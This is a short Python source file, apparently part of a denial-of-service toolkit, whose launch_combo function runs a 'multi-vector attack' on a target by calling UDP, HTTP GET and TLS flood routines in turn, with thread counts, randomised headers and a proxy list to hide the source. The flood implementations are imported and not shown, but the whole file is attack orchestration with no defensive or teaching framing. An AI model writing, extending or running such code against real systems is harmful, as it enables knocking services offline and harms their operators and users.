from core import udp_flood, http_flood, tls_flood

def launch_combo(target, port, threads, proxy_list):
    print(f"[COMBO] Running multi-vector attack on {target}:{port}")
    udp_flood.udp_flood(target, port, 1000, 512, threads)
    http_flood.http_get_flood(target, 1000, threads, random_headers=True, proxy_list=proxy_list)
    tls_flood.tls_flood(target, port, 1000, threads, proxy_list)
